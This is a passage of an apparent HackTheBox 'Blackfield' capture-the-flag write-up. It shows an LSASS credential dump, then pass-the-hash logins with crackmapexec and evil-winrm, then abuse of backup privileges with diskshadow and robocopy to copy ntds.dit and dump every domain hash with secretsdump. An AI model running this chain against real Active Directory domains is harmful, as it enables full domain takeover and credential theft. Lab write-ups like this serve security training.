domainname Window Manager
logon_server
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40310
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [9d76]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [9d76]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 40232 (9d28)
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40232
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [9d28]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [9d28]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:57:46.725846+00:00
sid S-1-5-20
luid 996
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [3e4]==
                username DC01$
                domainname BLACKFIELD
                password None
        == SSP [3e4]==
                username
                domainname
                password None
        == SSP [3e4]==
                username
                domainname
                password None
        == Kerberos ==
                Username: dc01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [3e4]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 24410 (5f5a)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-1
luid 24410
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [5f5a]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [5f5a]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 406499 (633e3)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
                Password: None
        == WDIGEST [633e3]==
                username svc_backup
                domainname BLACKFIELD
                password None
        == DPAPI [633e3]==
                luid 406499
                key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
                masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
                sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991

== LogonSession ==
authentication_id 366665 (59849)
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366665
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [59849]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [59849]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 366649 (59839)
session_id 2
username DWM-2
domainname Window Manager
logon_server
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366649
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [59839]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [59839]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 256940 (3ebac)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:59:13.068835+00:00
sid S-1-5-18
luid 256940
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL
                Password: None

== LogonSession ==
authentication_id 136764 (2163c)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:27.052945+00:00
sid S-1-5-18
luid 136764
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL
                Password: None

== LogonSession ==
authentication_id 134935 (20f17)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:58:26.834285+00:00
sid S-1-5-18
luid 134935
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.LOCAL
                Password: None

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server
logon_time 2020-02-23T17:57:47.162285+00:00
sid S-1-5-19
luid 997
        == WDIGEST [3e5]==
                username
                domainname
                password None
        == SSP [3e5]==
                username
                domainname
                password None
        == SSP [3e5]==
                username
                domainname
                password None
        == Kerberos ==
                Username:
                Domain:
                Password: None
        == WDIGEST [3e5]==
                username
                domainname
                password None

== LogonSession ==
authentication_id 24405 (5f55)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-0
luid 24405
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [5f55]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [5f55]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 24294 (5ee6)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-0
luid 24294
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [5ee6]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [5ee6]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 24282 (5eda)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-1
luid 24282
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == WDIGEST [5eda]==
                username DC01$
                domainname BLACKFIELD
                password None
        == Kerberos ==
                Username: DC01$
                Domain: BLACKFIELD.local
                Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
        == WDIGEST [5eda]==
                username DC01$
                domainname BLACKFIELD
                password None

== LogonSession ==
authentication_id 22028 (560c)
session_id 0
username
domainname
logon_server
logon_time 2020-02-23T17:57:44.959593+00:00
sid None
luid 22028
        == MSV ==
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
                SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
        == SSP [560c]==
                username
                domainname
                password None
        == SSP [560c]==
                username
                domainname
                password None
        == SSP [560c]==
                username
                domainname
                password None
        == SSP [560c]==
                username
                domainname
                password None
        == SSP [560c]==
                username
                domainname
                password None

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server
logon_time 2020-02-23T17:57:44.913221+00:00
sid S-1-5-18
luid 999
        == WDIGEST [3e7]==
                username DC01$
                domainname BLACKFIELD
                password None
        == SSP [3e7]==
                username
                domainname
                password None
        == SSP [3e7]==
                username
                domainname
                password None
        == SSP [3e7]==
                username
                domainname
                password None
        == SSP [3e7]==
                username
                domainname
                password None
        == SSP [3e7]==
                username
                domainname
                password None
        == SSP [3e7]==
                username
                domainname
                password None
        == SSP [3e7]==
                username
                domainname
                password None
        == Kerberos ==
                Username: dc01$
                Domain: BLACKFIELD.LOCAL
                Password: None
        == WDIGEST [3e7]==
                username DC01$
                domainname BLACKFIELD
                password None
        == DPAPI [3e7]==
                luid 999
                key_guid f7e926c-c502-4cad-90fa-32b78425b5a9
                masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
                sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
        == DPAPI [3e7]==
                luid 999
                key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
                masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
                sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
        == DPAPI [3e7]==
                luid 999
                key_guid 31632c55-7a7c-4c51-9065-65469950e94e
                masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
                sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
        == DPAPI [3e7]==
                luid 999
                key_guid 7e0da320-72c-4b4a-969f-62087d9f9870
                masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
                sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed
```

This LSASS dump contains the NTLM password hashes of `blackfield.local\Administrator`, `blackfield.local\svc_backup`, and `blackfield.local\DC01$`. It also contains the plaintext password of `blackfield.local\DC01$`. Attempting to pass these credentials to the domain controller reveals that the only valid credential is for `blackfield.local\svc_backup`.

```bash
$ crackmapexec smb 10.129.250.124 -d blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
SMB         10.129.250.124  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)
SMB         10.129.250.124  445    DC01             [+] blackfield.local\svc_backup 9658d1d1dcd9250115e2205d9f48400d
```

```bash
$ crackmapexec smb 10.129.250.124 -d blackfield.local -u Administrator -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
SMB         10.129.250.124  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)
SMB         10.129.250.124  445    DC01             [-] blackfield.local\Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE
```

```bash
$ crackmapexec smb 10.129.250.124 -d blackfield.local -u 'DC01$' -H b624dc83a27cc29da11d9bf25efea796
SMB         10.129.250.124  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)
SMB         10.129.250.124  445    DC01             [-] blackfield.local\DC01$:b624dc83a27cc29da11d9bf25efea796 STATUS_LOGON_FAILURE
```

---

## Foothold as `svc_backup`

Prior BloodHound analysis  revealed  `svc_backup` has `CanPSRemote` access to the domain controller. Use `svc_backup`'s NTLM hash to access it via WinRM and grab the user flag.

```bash
$ evil-winrm -i 10.129.250.124 -u blackfield.local\\svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> ls ../Desktop


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt
```

Prior BloodHound analysis also revealed that `svc_backup` is in the `Backup Operators` group. This gives them full access to the domain controller's file system.

![](images/Pasted%20image%2020211109100805.png)

---

## Privilege Escalation Enumeration

Windows Defender is preventing the execution of winPEAS. Proceed to manually enumerate the system.

Checking the privileges of `svc_backup`'s token, it appears it as the `SeBackUpPrivilege` and the `SeRestorePrivilege` (most likely due to being in the `Backup Operators` group).

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

These privileges can be leveraged to create backups of `ntds.dit` and the `SYSTEM` registry hive, which can be parsed offline to dump the domain accounts' hashes and Kerberos keys.

---

## Backup & Dump `ntds.dit`

Save a copy of the `SYSTEM` hive and transfer it to the attacking machine.

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save hklm\system .\system
The operation completed successfully.
```

Create a file of `diskshadow` commands named `tgihf.dsh` in `C:\Windows\Temp` that create a backup of the `C:` drive to the `Z:` drive.

```powershell
*Evil-WinRM* PS C:\windows\temp> echo "set context persistent nowriters" > tgihf.dsh
*Evil-WinRM* PS C:\windows\temp> echo "add volume c: alias tgihf" >> tgihf.dsh
*Evil-WinRM* PS C:\windows\temp> echo "create" >> tgihf.dsh
*Evil-WinRM* PS C:\windows\temp> echo "expose %tgihf% z:" >> tgihf.dsh
```

Execute the commands with `diskshadow`.

```powershell
*Evil-WinRM* PS C:\windows\temp> diskshadow /s tgihf.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  11/10/2021 2:24:43 PM

-> set context persistent nowriters
-> add volume c: alias tgihf
-> create
Alias tgihf for shadow ID {27433615-7a81-4315-a121-8886ed039364} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {f2091444-fba6-478b-ae71-3df94420d962} set as environment variable.

Querying all shadow copies with the shadow copy set ID {f2091444-fba6-478b-ae71-3df94420d962}

        * Shadow copy ID = {27433615-7a81-4315-a121-8886ed039364}               %tgihf%
                - Shadow copy set: {f2091444-fba6-478b-ae71-3df94420d962}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 11/10/2021 2:24:44 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %tgihf% z:
-> %tgihf% = {27433615-7a81-4315-a121-8886ed039364}
The shadow copy was successfully exposed as z:\.
->
```

Use the  `robocopy` command to create a backup of `Z:\Windows\ntds\ntds.dit` and download it back to the attacking machine.

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /b z:\windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Wednesday, November 10, 2021 2:30:22 PM
   Source : z:\windows\ntds\
     Dest : C:\Users\svc_backup\Documents\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\windows\ntds\
            New File              18.0 m        ntds.dit
 0.0%
 0.3%
 ...
 99.6%
 100%
 100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           205156173 Bytes/sec.
   Speed :           11739.130 MegaBytes/min.
   Ended : Wednesday, November 10, 2021 2:30:22 PM
*Evil-WinRM* PS C:\Users\svc_backup\Documents> download ntds.dit
```

Dump the secrets from `ntds.dit`.

```bash
$ impacket-secretsdump -ntds ntds.dit -system local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:3774928fe55833e6c62abdc233f47a7b:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
svc_backup:1413:aad3b435b51404eeaad3b435b51404ee:9658d1d1dcd9250115e2205d9f48400d:::
...
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:dbd84e6cf174af55675b4927ef9127a12aade143018c78fbbe568d394188f21f
Administrator:aes128-cts-hmac-sha1-96:8148b9b39b270c22aaa74476c63ef223
Administrator:des-cbc-md5:5d25a84ac8c229c1
DC01$:aes256-cts-hmac-sha1-96:f776aaeb0d21fbdd059145e1a5b71b886d2853577526e593be78f0fcda51b98a
DC01$:aes128-cts-hmac-sha1-96:e63ad6b1905c268856a15b4e75edaf9f
DC01$:des-cbc-md5:efc85ee957a7fb0d
krbtgt:aes256-cts-hmac-sha1-96:bd31681b175bd44ddf68c064445ca4e510ba2115e106905bdfef6ef0ff66b32c
krbtgt:aes128-cts-hmac-sha1-96:676f63c263b8d482b271d091b2dde762
krbtgt:des-cbc-md5:fb4cb5761aef465d
audit2020:aes256-cts-hmac-sha1-96:bdeca8eb67c5e70984efdfb33defdfc15644408fb06e948df7dba6d1760e0c0e
audit2020:aes128-cts-hmac-sha1-96:5d1e1cb1fc6b59436fe9c9454c1d1608
audit2020:des-cbc-md5:c40701e67a10b673
support:aes256-cts-hmac-sha1-96:74574c46cab866ba40841f83b1226d429f6338fdf574f9a232ef551f9b7550c9
support:aes128-cts-hmac-sha1-96:19331e579612b1eb3356e8b5f0e2d890
support:des-cbc-md5:dfae341cef208f52
svc_backup:aes256-cts-hmac-sha1-96:20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
svc_backup:aes128-cts-hmac-sha1-96:139276fff0dcec3c349cb8b563691d06
svc_backup:des-cbc-md5:981a38735d7c32d6
...
[*] Cleaning up...
```

Pass the domain administrator's hash to access the domain controller via WinRM and read the system flag.

```bash
$ evil-winrm -i 10.129.244.20 -u blackfield.local\\Administrator -H 184fb5e5178480be64824d4cd53b99ee

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls C:\Users\Administrator\Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
-a----        11/5/2020   8:38 PM             32 root.txt
```
